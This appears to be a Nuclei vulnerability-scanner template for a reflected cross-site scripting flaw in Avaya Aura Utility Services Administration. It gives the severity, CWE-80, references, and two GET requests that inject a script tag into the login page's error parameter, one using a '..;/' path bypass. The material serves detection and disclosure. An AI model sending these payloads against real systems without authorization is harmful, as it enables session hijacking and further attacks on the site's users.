# Nuclei Template: Avaya Aura Utility Services Administration - Cross-Site Scripting
**Template ID:** avaya-aura-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`avaya-aura-xss.yaml`)

## Vulnerability Information & PoC

## Description
Avaya Aura Utility Services Administration contains a cross-site scripting vulnerability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e
GET {{BaseURL}}/acs/..;/admin/public/login.jsp?error=%3Cscript%3Ealert(document.domain)%3C/script%3e
```

## References
- https://blog.assetnote.io/2023/02/01/rce-in-avaya-aura/
- https://download.avaya.com/css/public/documents/101076366
